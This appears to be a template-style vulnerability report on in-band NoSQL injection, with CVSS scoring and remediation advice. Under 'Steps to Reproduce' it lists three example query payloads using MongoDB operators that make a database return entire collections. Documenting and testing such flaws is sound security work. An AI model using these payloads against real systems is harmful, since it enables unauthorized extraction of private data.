# NoSQL Injection - In-Band Data Extraction

**Title:** In-Band NoSQL Injection for Full Collection Extraction

**Severity:** High

**Impact:** High

**Exploitability:** High

**CVSS Base Score:** 7.5

**CVSS v3 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

**Vulnerability Type:** NoSQL Injection

**Target:** Search or query parameters

## Impact

Return entire collections or documents, leading to full database exfiltration.

## Description

By using operators in query parameters, attackers can force the database to return all matching documents instead of intended results.

## Steps to Reproduce

Return entire collections or documents:

http://target/?q[$regex]=.*

http://target/?q[$ne]='doesntExist'

http://target/?q[$gt]=''

## Recommendation

Use safe query construction. Validate all input. Limit query results based on user permissions.

## References

MongoDB security best practices and NoSQL injection guides.